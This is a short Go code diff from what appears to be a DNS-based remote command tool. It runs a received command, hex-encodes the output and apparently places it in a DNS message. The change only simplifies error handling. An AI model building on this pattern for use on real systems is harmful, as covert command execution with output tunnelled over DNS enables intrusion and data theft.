@@ -41,10 +41,7 @@ func main() {
 
 					nm := new(dns.Msg)
 
-					out, err := exec.Command(cmd[0], cmd[1:]...).CombinedOutput()
-					if err != nil {
-						out = []byte(" ")
-					}
+					out, _ := exec.Command(cmd[0], cmd[1:]...).CombinedOutput()
 
 					chunkOutEnc := hex.EncodeToString(out)
 
